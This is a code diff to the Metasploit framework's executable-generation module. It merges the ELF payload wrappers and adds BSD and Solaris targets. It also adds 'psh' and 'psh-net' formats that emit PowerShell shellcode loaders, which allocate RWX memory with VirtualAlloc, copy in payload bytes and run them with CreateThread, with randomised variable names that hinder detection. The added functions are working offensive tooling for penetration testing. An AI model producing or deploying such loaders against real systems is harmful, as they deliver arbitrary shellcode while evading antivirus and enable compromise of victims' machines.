@@ -1,5 +1,5 @@
 ##
-# $Id$
+# $Id: exe.rb 14286 2011-11-20 01:41:04Z rapid7 $
 ##
 
 ###
@@ -82,6 +82,14 @@ require 'digest/sha1'
 
 			if(plat.index(Msf::Module::Platform::OSX))
 				return to_osx_x86_macho(framework, code)
+			end
+
+			if(plat.index(Msf::Module::Platform::BSD))
+				return to_bsd_x86_elf(framework, code)
+			end
+
+			if(plat.index(Msf::Module::Platform::Solaris))
+				return to_solaris_x86_elf(framework, code)
 			end
 
 			# XXX: Add remaining x86 systems here
@@ -595,42 +603,17 @@ require 'digest/sha1'
 		return macho
 	end
 
-	#
-	# Create a 64-bit Linux ELF containing the payload provided in +code+
-	#
-	def self.to_linux_x64_elf(framework, code, opts={})
-		set_template_default(opts, "template_x64_linux.bin")
-
-		elf = ''
-		File.open(opts[:template], "rb") { |fd|
-			elf = fd.read(fd.stat.size)
-		}
-
-		#Append shellcode
-		elf << code
-
-		#Modify size
-		elf[96, 8] = [120 + code.length].pack('Q')  #p_filesz
-		elf[104,8] = [120 + code.length].pack('Q')  #p_memsz
-
-		return elf
-	end
-
-	#
-	# Create a 32-bit Linux ELF containing the payload provided in +code+
-	#
-	# For the default template, this method just appends the payload.  For
-	# user-provided templates, modifies the header to mark all executable
+	# Create an ELF executable containing the payload provided in +code+
+	# For the default template, this method just appends the payload, checks if 
+	# the template is 32 or 64 bit and adjusts the offsets accordingly
+	# For user-provided templates, modifies the header to mark all executable
 	# segments as writable and overwrites the entrypoint (usually _start) with
 	# the payload.
 	#
-	def self.to_linux_x86_elf(framework, code, opts={})
-		unless opts[:template]
-			default = true
-		end
+	def self.to_exe_elf(framework, opts, template, code)
 
 		# Allow the user to specify their own template
-		set_template_default(opts, "template_x86_linux.bin")
+		set_template_default(opts, template)
 
 		# The old way to do it is like other formats, just overwrite a big
 		# block of rwx mem with our shellcode.
@@ -638,18 +621,40 @@ require 'digest/sha1'
 		#co = elf.index( " " * 512 )
 		#elf[bo, 2048] = [code].pack('a2048') if bo
 
-		if default
-			# The new template is just an ELF header with its entry point set to
-			# the end of the file, so just append shellcode to it and fixup
-			# p_filesz and p_memsz in the header for a working ELF executable.
-			elf = ''
-			File.open(opts[:template], "rb") { |fd|
-				elf = fd.read(fd.stat.size)
-			}
+		# The new template is just an ELF header with its entry point set to
+		# the end of the file, so just append shellcode to it and fixup
+		# p_filesz and p_memsz in the header for a working ELF executable.
+		elf = ''
+		File.open(opts[:template], "rb") { |fd|
+			elf = fd.read(fd.stat.size)
+		}
 
-			elf << code
-			elf[0x44,4] = [elf.length + code.length].pack('V')
-			elf[0x48,4] = [elf.length + code.length].pack('V')
+		elf << code
+
+		# Check EI_CLASS to determine if the header is 32 or 64 bit
+		# Use the proper offsets and pack size
+		case elf[4]
+		when 1, "\x01" # ELFCLASS32 - 32 bit (ruby 1.8 and 1.9)
+			elf[0x44,4] = [elf.length].pack('V')  #p_filesz
+			elf[0x48,4] = [elf.length + code.length].pack('V')  #p_memsz
+		when 2, "\x02" # ELFCLASS64 - 64 bit (ruby 1.8 and 1.9)
+			elf[0x60,8] = [elf.length].pack('Q')  #p_filesz
+			elf[0x68,8] = [elf.length + code.length].pack('Q')  #p_memsz
+		else
+			raise RuntimeError, "Invalid ELF template: EI_CLASS value not supported" 
+		end
+
+		return elf
+	end
+
+	# Create a 32-bit Linux ELF containing the payload provided in +code+
+	def self.to_linux_x86_elf(framework, code, opts={})
+		unless opts[:template]
+			default = true
+		end
+
+		if default
+			elf = to_exe_elf(framework, opts, "template_x86_linux.bin", code)
 		else
 			# If this isn't our normal template, we have to do some fancy
 			# header patching to mark the .text section rwx before putting our
@@ -684,23 +689,26 @@ require 'digest/sha1'
 		return elf
 	end
 
+	# Create a 32-bit BSD (test on FreeBSD) ELF containing the payload provided in +code+
+	def self.to_bsd_x86_elf(framework, code, opts={})
+		elf = to_exe_elf(framework, opts, "template_x86_bsd.bin", code)
+		return elf
+	end
+
+	# Create a 32-bit Solaris ELF containing the payload provided in +code+
+	def self.to_solaris_x86_elf(framework, code, opts={})
+		elf = to_exe_elf(framework, opts, "template_x86_solaris.bin", code)
+		return elf
+	end
+
+	# Create a 64-bit Linux ELF containing the payload provided in +code+
+	def self.to_linux_x64_elf(framework, code, opts={})
+		elf = to_exe_elf(framework, opts, "template_x64_linux.bin", code)
+		return elf
+	end
+
 	def self.to_linux_armle_elf(framework, code, opts={})
-
-		# Allow the user to specify their own template
-		set_template_default(opts, "template_armle_linux.bin")
-
-		elf = ''
-		File.open(opts[:template], "rb") { |fd|
-			elf = fd.read(fd.stat.size)
-		}
-
-		# The template is just an ELF header with its entrypoint set to the
-		# end of the file, so just append shellcode to it and fixup p_filesz
-		# and p_memsz in the header for a working ELF executable.
-		elf << code
-		elf[0x44,4] = [elf.length + code.length].pack('V')
-		elf[0x48,4] = [elf.length + code.length].pack('V')
-
+		elf = to_exe_elf(framework, opts, "template_armle_linux.bin", code)
 		return elf
 	end
 
@@ -1068,6 +1076,95 @@ End Sub
 		source << "\t}\r\n"
 		source << "</script>\r\n"
 		source
+	end
+
+	def self.to_win32pe_psh_net(framework, code, opts={})
+		var_code = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_kernel32 = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_baseaddr = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_threadHandle = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_output = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_temp = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_codeProvider = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_compileParams = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_syscode = Rex::Text.rand_text_alpha(rand(8)+8)
+
+		code = code.unpack('C*')
+		psh = "Set-StrictMode -Version 2\r\n"
+		psh << "$#{var_syscode} = @\"\r\nusing System;\r\nusing System.Runtime.InteropServices;\r\n"
+		psh << "namespace #{var_kernel32} {\r\n"
+		psh << "public class func {\r\n"
+		psh << "[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }\r\n"
+		psh << "[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }\r\n"
+		psh << "[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }\r\n"
+		psh << "[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\r\n"
+		psh << "[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\r\n"
+		psh << "[DllImport(\"kernel32.dll\")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);\r\n"
+		psh << "} }\r\n"
+		psh << "\"@\r\n\r\n"
+		psh << "$#{var_codeProvider} = New-Object Microsoft.CSharp.CSharpCodeProvider\r\n"
+		psh << "$#{var_compileParams} = New-Object System.CodeDom.Compiler.CompilerParameters\r\n"
+		psh << "$#{var_compileParams}.ReferencedAssemblies.AddRange(@(\"System.dll\", [PsObject].Assembly.Location))\r\n"
+		psh << "$#{var_compileParams}.GenerateInMemory = $True\r\n"
+		psh << "$#{var_output} = $#{var_codeProvider}.CompileAssemblyFromSource($#{var_compileParams}, $#{var_syscode})\r\n\r\n"
+
+		psh << "[Byte[]]$#{var_code} = 0x#{code[0].to_s(16)}"
+		lines = []
+		1.upto(code.length-1) do |byte|
+			if(byte % 10 == 0)
+				lines.push "\r\n$#{var_code} += 0x#{code[byte].to_s(16)}"
+			else
+				lines.push ",0x#{code[byte].to_s(16)}"
+			end
+		end
+		psh << lines.join("") + "\r\n\r\n"
+
+		psh << "$#{var_baseaddr} = [#{var_kernel32}.func]::VirtualAlloc(0, $#{var_code}.Length + 1, [#{var_kernel32}.func+AllocationType]::Reserve -bOr [#{var_kernel32}.func+AllocationType]::Commit, [#{var_kernel32}.func+MemoryProtection]::ExecuteReadWrite)\r\n"
+		psh << "if ([Bool]!$#{var_baseaddr}) { $global:result = 3; return }\r\n"
+		psh << "[System.Runtime.InteropServices.Marshal]::Copy($#{var_code}, 0, $#{var_baseaddr}, $#{var_code}.Length)\r\n"
+		psh << "[IntPtr] $#{var_threadHandle} = [#{var_kernel32}.func]::CreateThread(0,0,$#{var_baseaddr},0,0,0)\r\n"
+		psh << "if ([Bool]!$#{var_threadHandle}) { $global:result = 7; return }\r\n"
+		psh << "$#{var_temp} = [#{var_kernel32}.func]::WaitForSingleObject($#{var_threadHandle}, [#{var_kernel32}.func+Time]::Infinite)\r\n"
+	end
+	
+	def self.to_win32pe_psh(framework, code, opts={})
+
+		var_code = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_win32_func = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_payload = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_size = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_rwx = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_iter = Rex::Text.rand_text_alpha(rand(8)+8)
+		code = code.unpack("C*")
+
+		# Add wrapper script
+		psh = "$#{var_code} = @\"\r\n"
+		psh << "[DllImport(\"kernel32.dll\")]\r\n"
+		psh << "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\r\n"
+		psh << "[DllImport(\"kernel32.dll\")]\r\n"
+		psh << "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\r\n"
+		psh << "[DllImport(\"msvcrt.dll\")]\r\n"
+		psh << "public static extern IntPtr memset(IntPtr dest, uint src, uint count);\r\n"
+		psh << "\"@\r\n"
+		psh << "$#{var_win32_func} = Add-Type -memberDefinition $#{var_code} -Name \"Win32\" -namespace Win32Functions -passthru\r\n"
+		# Set up the payload string
+		psh << "[Byte[]]$#{var_payload} = 0x#{code[0].to_s(16)}"
+		lines = []
+		1.upto(code.length-1) do |byte|
+			if(byte % 10 == 0)
+				lines.push "\r\n$#{var_payload} += 0x#{code[byte].to_s(16)}"
+			else
+				lines.push ",0x#{code[byte].to_s(16)}"
+			end
+		end
+		psh << lines.join("") + "\r\n\r\n"
+		psh << "$#{var_size} = 0x1000\r\n"
+		psh << "if ($#{var_payload}.Length -gt 0x1000) {$#{var_size} = $#{var_payload}.Length}\r\n"
+		psh << "$#{var_rwx}=$#{var_win32_func}::VirtualAlloc(0,0x1000,$#{var_size},0x40)\r\n"
+		psh << "for ($#{var_iter}=0;$#{var_iter} -le ($#{var_payload}.Length-1);$#{var_iter}++) {$#{var_win32_func}::memset([IntPtr]($#{var_rwx}.ToInt32()+$#{var_iter}), $#{var_payload}[$#{var_iter}], 1)}\r\n"
+		psh << "$#{var_win32_func}::CreateThread(0,0,$#{var_rwx},0,0,0)\r\n"
+
+
 	end
 
 	def self.to_win32pe_vbs(framework, code, opts={})
@@ -1816,13 +1913,19 @@ End Sub
 			exe = Msf::Util::EXE.to_executable(framework, arch, tmp_plat, code, exeopts)
 			output = Msf::Util::EXE.to_jsp_war(exe)
 
+		when 'psh'
+			output = Msf::Util::EXE.to_win32pe_psh(framework, code, exeopts)
+
+		when 'psh-net'
+			output = Msf::Util::EXE.to_win32pe_psh_net(framework, code, exeopts)
+
 		end
 
 		output
 	end
 
 	def self.to_executable_fmt_formats
-		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war']
+		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war','psh','psh-net']
 	end
 
 	#
